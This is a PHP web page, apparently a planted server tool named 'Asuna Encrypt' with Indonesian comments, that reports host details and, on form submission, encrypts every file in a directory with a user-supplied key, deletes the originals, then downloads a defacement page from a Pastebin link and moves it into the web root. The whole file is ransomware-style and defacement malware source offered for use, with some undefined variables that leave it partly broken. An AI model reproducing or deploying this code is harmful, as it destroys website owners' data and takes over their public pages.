<!DOCTYPE html>
<html>
<head>
    <title>Asuna Encrypt</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/hendprw/asuna/style.css"/>
</head>
<body>
    <h1>ASUNA</h1>
    <form method="POST">
        <tanda for="key">Enter key to encrypt files:</tanda><br>
        <input type="text" id="key" name="key"><br>
        <input type="submit" value="Submit">
    </form>
    <div class="baginf">
        <h2>Server Information:</h2>
        <ul>
            <li>Web Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
            <li>System : <?php $uname = explode(" ", php_uname()); echo $uname[0] . " " . $uname[1]; ?></li>
            <li>IP : <?php echo gethostbyname($_SERVER['HTTP_HOST']); ?></li>            
            <li>Mysql : <?php echo (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";?></li>
           <li>Server Country: <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A'; ?></li>
            <li>Server Version: <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
        </ul>
    </div>
    <?php
function getServerCountry() {
        $ip = $_SERVER['SERVER_ADDR'];
        if (function_exists('geoip_country_name_by_name')) {
            $country = geoip_country_name_by_name($ip);
            if ($country) {
                return $country;
            }
        }
        return 'N/A';
    }
    
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $key = $_POST['key'];
        $encryptedFiles = 0;
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $name => $file) {
            if (! $file->isDir()) {
                $content = file_get_contents($name);
                $iv = openssl_random_pseudo_bytes(16);
                $encrypted = openssl_encrypt($content, 'AES-256-CBC', $key, 0, $iv);
                file_put_contents($name . '.AsunaYuuki', $iv . $encrypted);
                unlink($name);
                $encryptedFiles++;
                $progress = round(($encryptedFiles / $totalFiles) * 100, 2);
                echo "Meng-Enkripsi file $name ($progress%)...<br>";
                flush();
                ob_flush();
            }
        }
        echo "File Berhasil Di Enkripsi";
        // Etto, ini fungsi buat download script deface Download file dari Pastebin
        $fileUrl = 'https://pastebin.com/raw/xxxxxxxx';
        $data = file_get_contents($fileUrl);
        file_put_contents('index.html', $data);
        // jan diubah, ini cuma fungsi buat mindah file index ke root
        rename('index.html', $_SERVER['DOCUMENT_ROOT'] . '/index.html');
        echo "Script Deface Mu Berhasil dipindahkan ke direktori ROOT.";
    }
    ?>
    </body>
    </html>
